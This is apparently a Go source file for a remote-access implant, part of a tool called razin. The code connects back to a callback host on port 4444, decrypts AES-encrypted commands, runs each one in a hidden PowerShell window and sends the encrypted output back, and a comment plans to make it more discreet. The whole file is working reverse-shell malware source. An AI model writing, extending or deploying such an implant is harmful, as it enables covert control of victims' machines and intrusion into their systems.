package cmd

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"syscall"

	"github.com/bogdzn/razin/server/aes"
	"github.com/spf13/cobra"
)

type CliOptions struct {

	// Port to connect to
	Port int

	// Address to connect to
	Address string

	// Enable debug trace
	DebugEnabled bool

	// AES-key to use for communications
	AesKey string
}

func CliDefaults() *CliOptions {

	return &CliOptions{
		Port:         4444,
		Address:      "10.0.2.2",
		DebugEnabled: false,
		AesKey:       "RAZINrazinRAZINrazinRAZINrazinRAZINraz",
	}
}

func LoadServerCLI(opts *CliOptions) *cobra.Command {

	version := "0.0.1"
	var cmd = &cobra.Command{
		Use:                "implant",
		Version:            version,
		DisableSuggestions: true,
		Short:              "AES-over-TCP implant",
		Long:               "Executes commands on a target machine & communicates with AES",
		Run: func(cmd *cobra.Command, args []string) {

			/* set up TCP connection with server */
			conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", opts.Address, opts.Port))
			if err != nil {
				panic(err)
			}

			/*
			   From this side, we are only connected with one server, no need to account for multiple
			   connection, so lets just keep it simple i guess...
			*/
			for {

				/* from this side, we receive input line-by-line */
				msg, _ := bufio.NewReader(conn).ReadString('\n')
				decrypted := aes.AesDecrypt(msg, opts.AesKey)

				if opts.DebugEnabled {
					fmt.Printf(" ---=== [ new packet ] ===---\nReceived: %s\nTranslated: %s\n\n", msg, decrypted)
				}

				/* TODO: improve the call to powershell to something more discreet lol */
				cmd := exec.Command("powershell", decrypted)
				cmd.SysProcAttr = &syscall.SysProcAttr{
					HideWindow: true,
				}

				/* retrieve output or error & send it back! */
				out, err := cmd.Output()
				if err != nil {
					fmt.Fprint(conn, aes.EncryptAes("command failure:\n", opts.AesKey))
					fmt.Fprint(conn, aes.EncryptAes(err.Error(), opts.AesKey))
				} else {

					fmt.Fprint(conn, aes.EncryptAes(string(out), opts.AesKey)+"\n")
				}
			}
		},
	}

	defaults := CliDefaults()

	cmd.PersistentFlags().BoolVarP(&defaults.DebugEnabled, "debug", "d", false, "enable debug trace")
	cmd.PersistentFlags().IntVarP(&defaults.Port, "port", "p", 4444, "callback port")
	cmd.PersistentFlags().StringVarP(&defaults.Address, "address", "a", defaults.Address, "callback address")
	cmd.PersistentFlags().StringVarP(&defaults.AesKey, "key", "k", defaults.AesKey, "default AES key for communications")

	return cmd
}
